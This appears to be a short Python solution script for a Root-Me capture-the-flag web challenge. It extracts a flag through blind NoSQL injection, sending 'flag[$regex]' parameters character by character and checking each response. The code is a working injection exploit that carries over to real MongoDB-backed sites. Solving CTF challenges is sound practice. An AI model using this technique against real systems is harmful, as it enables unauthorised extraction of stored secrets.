import requests
import string

flag = ""
url = "http://challenge01.root-me.org/web-serveur/ch48/index.php"

while 1:
	for i in string.ascii_letters + string.digits + "!@$%-()@_{}":
		payload = flag + i
		params = {}
		params['chall_name'] = 'nosqlblind'
		params['flag[$regex]'] = "^"+payload
		r = requests.get(url,params=params)
		if "Yeah" in r.text:
			print(payload)
			flag = payload
			print("\nFlag: " + flag)
			break
	
